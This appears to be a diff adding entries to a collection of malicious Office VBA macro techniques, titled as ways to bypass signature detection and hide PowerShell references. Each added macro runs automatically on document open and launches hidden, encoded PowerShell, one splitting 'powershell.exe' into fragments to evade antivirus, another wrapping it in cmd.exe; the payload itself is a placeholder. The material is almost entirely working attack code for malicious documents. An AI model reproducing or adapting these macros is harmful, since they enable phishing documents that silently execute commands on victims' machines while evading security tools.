@@ -114,3 +114,36 @@
         
             CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
         End Sub
+
+#### 4) String Concatenation to Bypass Signature Detection
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+        
+        Sub Document_Open()
+            MyMacro
+        End Sub
+        
+        Sub MyMacro()
+            Dim cmdStr As String
+            cmdStr = "powe" & "rshe" & "ll.exe"
+            cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
+            CreateObject("Wscript.Shell").Run cmdStr
+        End Sub
+
+#### 5) Executing Encoded Commands without Direct PowerShell reference
+
+        Sub AutoOpen()
+            MyMacro
+        End Sub
+        
+        Sub Document_Open()
+            MyMacro
+        End Sub
+        
+        Sub MyMacro()
+            Dim cmdStr As String
+            cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
+            CreateObject("Wscript.Shell").Run cmdStr
+        End Sub
